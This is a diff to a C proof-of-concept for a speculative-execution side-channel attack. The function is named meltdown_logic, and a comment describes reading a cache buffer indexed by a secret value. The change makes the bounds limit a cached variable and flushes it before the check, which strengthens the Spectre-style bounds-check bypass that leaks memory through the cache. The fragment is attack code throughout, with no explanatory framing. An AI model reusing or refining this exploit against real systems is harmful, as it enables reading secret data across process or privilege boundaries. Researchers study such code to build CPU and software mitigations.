@@ -30,6 +30,7 @@ volatile Array *temp_scratchpad;
 
 // memory!
 volatile int *branch_variable;
+volatile int *array_size;
 
 /* some function definitions */
 void *
@@ -45,6 +46,8 @@ alloc_memory() {
     scratchpad = mmap_size(sizeof(Array) * 256);
     temp_scratchpad = mmap_size(sizeof(Array) * 256);
     branch_variable = mmap_size(0x1000);
+    array_size = mmap_size(sizeof(int));
+    *array_size = 0x1000;
 }
 
 
@@ -59,9 +62,10 @@ int meltdown_logic(int *branch_variable,
     }
 
     // flush branch variable from cache
-    _mm_clflush(branch_variable);
+    *branch_variable;
+    _mm_clflush(array_size);
     _mm_mfence();
-    if (*branch_variable < 0x1000 && *branch_variable >= 0) {
+    if (*branch_variable < *array_size && *branch_variable >= 0) {
         // excute the following line speculatively
         // will access cachepad indexed by secret[idx]
         i &= cachepad[some_array[*branch_variable]].data[0];
